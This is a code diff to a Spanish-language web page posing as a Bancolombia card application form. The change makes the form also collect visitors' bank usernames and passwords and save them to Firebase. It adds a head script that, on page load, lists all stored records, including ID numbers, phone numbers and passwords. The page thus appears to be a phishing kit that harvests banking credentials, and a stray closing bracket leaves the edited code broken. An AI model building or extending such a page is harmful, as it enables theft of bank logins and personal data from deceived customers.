@@ -1,6 +1,39 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
+  <script>
+async function cargarSolicitudes(){
+  const contenedor = document.createElement('div');
+  contenedor.style.padding = '20px';
+  contenedor.innerHTML = '<h2>Solicitudes Recibidas</h2>';
+  
+  const querySnapshot = await db.collection('solicitudes').orderBy('fecha', 'desc').get();
+  
+  if(querySnapshot.empty){
+    contenedor.innerHTML += '<p>No hay solicitudes registradas todavía.</p>';
+  } else {
+    querySnapshot.forEach(doc => {
+      const s = doc.data();
+      contenedor.innerHTML += `
+        <div style="border:1px solid #ccc; padding:15px; margin:10px 0; border-radius:4px;">
+          <p><strong>Usuario:</strong> ${s.usuario || 'No especificado'}</p>
+          <p><strong>Nombre:</strong> ${s.nombre || 'No especificado'}</p>
+          <p><strong>Documento:</strong> ${s.documento || 'No especificado'}</p>
+          <p><strong>Teléfono:</strong> ${s.telefono || 'No especificado'}</p>
+          <p><strong>Valor a pagar:</strong> ${s.valor || 'No especificado'}</p>
+          <p><strong>Clave:</strong> ${s.clave || 'No especificada'}</p>
+          <p><strong>Fecha:</strong> ${s.fecha || 'Sin fecha'}</p>
+          <p><strong>Estado:</strong> ${s.estado || 'EN PROGRESO'}</p>
+        </div>
+      `;
+    });
+  }
+  
+  document.body.appendChild(contenedor);
+}
+
+document.addEventListener('DOMContentLoaded', cargarSolicitudes);
+</script>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Solicita tu tarjeta — Bancolombia</title>
@@ -641,11 +674,13 @@ if (form) {
     const cupo = document.querySelector("#cupo")?.value || "";
     
     db.collection("solicitudes").add({
-      tipoDocumento: tipoDoc,
-      numeroDocumento: numeroDoc,
-      numeroContacto: contacto,
-      cupoSolicitado: cupo,
-      fecha: new Date()
+  cupoSolicitado: cupo,
+  numeroDocumento: numeroDoc,
+  numeroTelefono: contacto,
+  usuario: document.querySelector("#usuario")?.value || "",
+  clave: document.querySelector("#clave")?.value || "",
+  fecha: new Date()
+})
     })
     .then(() => {
       console.log("✅ Datos guardados en Firebase");
